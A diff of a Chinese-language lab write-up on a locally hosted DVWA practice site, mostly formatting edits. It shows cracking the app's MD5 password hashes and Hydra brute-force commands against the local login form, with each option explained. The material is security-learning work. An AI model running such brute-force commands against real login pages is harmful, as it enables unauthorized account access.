@@ -66,12 +66,13 @@ $_DVWA[ 'db_database' ] = 'dvwa';
 ```
 * 进行好上面的设置之后，在DVWA的页面上点击数据库设置按钮进行数据库设置。
 
-#登录页面
+##登录页面
 
 此时就应该能成功看见DVWA的登录页面了
 通过MariaDB中的用户数据库，可以查看DVWA中的用户帐号和MD5加密密码
 直接用MD5对加密密码进行解密，即可登录进页面。
 gordonb这个用户对应的密码为abc123
+
 ```
 MariaDB [(none)]> use dvwa
 Reading table information for completion of table and column names
@@ -99,14 +100,15 @@ MariaDB [dvwa]> select * from users;
 +---------+------------+-----------+---------+----------------------------------+----------------------------------+---------------------+--------------+
 5 rows in set (0.001 sec)
 ```
-#Brute Force Attack
+##Brute Force Attack
+
 先玩了一下暴力破解的模块
 找到了Kali Linux的密码破解工具箱里有一个叫Hydra的东东，打开是一堆命令行：
 研究了半天命令行怎么用，最终琢磨出来下面的命令行：
--x 6:6:a1 表示，即时生成6位以小写字母和数字构成的密码，逐个尝试
-127.0.0.1 自己搭建的服务器地址，应为网站域名
-http-post-form 帐号密码提交属于这个请求类别
-/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:S=logout ^USER^ ^PASS^ 均为占位符，对应前面的用户名和密码
+`-x 6:6:a1` 表示，即时生成6位以小写字母和数字构成的密码，逐个尝试
+`127.0.0.1` 自己搭建的服务器地址，应为网站域名
+`http-post-form` 帐号密码提交属于这个请求类别
+`/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:S=logout ^USER^ ^PASS^` 均为占位符，对应前面的用户名和密码
 
 ```
 hydra -l gordonb -x 6:6:a1 127.0.0.1 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:S=logout" -vV -f
@@ -145,6 +147,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-06-14 09:29:
 ```
 运行之后，程序就开始一行一行猜了，我算了一下，一共6位密码，每一位有36种可能，假设每秒钟可以尝试36组密码，大约需要699.84天...天啊...遂把程序停掉...
 用密码试一试，看看破解的界面长什么样好了...
+
 ```
 kate@Argo:~$ hydra -l gordonb -p abc123 127.0.0.1 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:S=logout" -vV -f
 Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
